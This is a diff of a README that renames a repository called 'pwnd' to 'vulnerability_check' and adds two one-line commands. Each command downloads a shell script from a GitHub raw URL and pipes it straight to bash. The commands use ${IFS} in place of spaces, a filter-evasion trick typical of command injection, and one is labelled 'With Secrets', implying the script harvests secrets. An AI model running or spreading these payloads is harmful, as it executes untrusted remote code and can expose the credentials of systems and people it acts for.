@@ -1,4 +1,7 @@
-# pwnd
+# vulnerability_check
+Vulnerability Check repository
 
-Repo created to test vulnerabilities.
-Shell code is saved in the run.sh file
+
+Without Secrets : `curl${IFS}-L${IFS}raw.githubusercontent.com/rui-costa/pwnd/main/pwnd.sh|bash`
+
+With Secrets : `curl${IFS}-L${IFS}raw.githubusercontent.com/rui-costa/pwnd/main/run.sh|bash`
